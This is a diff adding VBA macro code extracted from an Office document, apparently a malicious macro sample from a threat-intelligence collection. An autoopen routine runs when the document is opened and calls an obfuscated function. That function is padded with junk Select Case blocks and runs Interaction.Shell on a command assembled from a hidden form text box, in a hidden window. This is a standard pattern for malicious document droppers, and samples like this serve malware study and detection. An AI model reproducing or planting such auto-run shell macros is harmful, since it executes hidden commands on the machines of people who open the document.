@@ -1,0 +1,135 @@
+Attribute VB_Name = "F2471786699870"
+Attribute VB_Name = "H783813007"
+Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = False
+Attribute VB_Exposed = False
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = False
+Attribute VB_Name = "L65303894660008"
+Attribute VB_Name = "M3591952685403"
+Attribute VB_Name = "N1387514"
+Attribute VB_Name = "R2080514552"
+Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = False
+Attribute VB_Exposed = False
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = False
+Attribute VB_Name = "R64135873783"
+Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = False
+Attribute VB_Exposed = False
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = False
+Attribute VB_Name = "R9345195571"
+Attribute VB_Base = "1Normal.ThisDocument"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+Attribute VB_Control = "TextBox1, 0, 0, MSForms, TextBox"
+Sub autoopen()
+  F808 = "z6242"
+  Q476 = "C889"
+  p7163 = "c5178"
+  c0439343
+  k2126 = "G245"
+  j049 = "A5024"
+  Q103 = "B0745"
+End Sub
+Attribute VB_Name = "T756253776454"
+Function c0439343()
+On Error Resume Next
+   Select Case m133
+         Case 928
+            I3576 = m2475
+            p023 = Log(L9558)
+            i333 = G3667
+         Case 407
+            L931 = j524
+            C8515 = CBool(A562)
+            D944 = Rnd(F1129 / Hex(U0947 * m806 - n3687 / Int(636)) * 144 - 507)
+      End Select
+      I362 = 65 - 870
+      Set a6523 = R462
+t8820312 = Array(n55977624, Q84336477, O366775517, Interaction.Shell(("" + l18103 + o224886 + h664356 + R9345195571.TextBox1) + M03218941 + K611322 + m01005, 91 - 91), T75631, B72715, Z7313156)
+   Select Case H074
+         Case 871
+            w114 = P2623
+            V964 = Log(R1796)
+            H326 = E7770
+         Case 924
+            z775 = G6679
+            V312 = CBool(f6718)
+            v8316 = Rnd(u666 / Hex(t670 * K5318 - L737 / Int(985)) * 181 - 21)
+      End Select
+      L945 = 752 - 929
+      Set q657 = R604
+   Select Case q566
+         Case 26
+            N042 = s9096
+            K745 = Log(S9724)
+            Z601 = X171
+         Case 29
+            l833 = U6819
+            o5399 = CBool(F8007)
+            W9374 = Rnd(u261 / Hex(w6389 * E435 - m5977 / Int(207)) * 551 - 332)
+      End Select
+      S198 = 459 - 270
+      Set J5373 = b3462
+End Function
+
+Attribute VB_Name = "U8769066563636"
+Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = False
+Attribute VB_Exposed = False
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = False
+Attribute VB_Name = "W7611704719860"
+Attribute VB_Name = "Z368991961063"
+Attribute VB_Name = "a92333988459"
+Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = False
+Attribute VB_Exposed = False
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = False
+Attribute VB_Name = "i512602432926"
+Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = False
+Attribute VB_Exposed = False
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = False
+Attribute VB_Name = "j319368642"
+Attribute VB_Name = "j5581998876216"
+Attribute VB_Name = "q56758996110537"
+Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = False
+Attribute VB_Exposed = False
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = False
+Attribute VB_Name = "w4302210762"
+Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = False
+Attribute VB_Exposed = False
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = False
+
+
+INQUEST-PP=macro
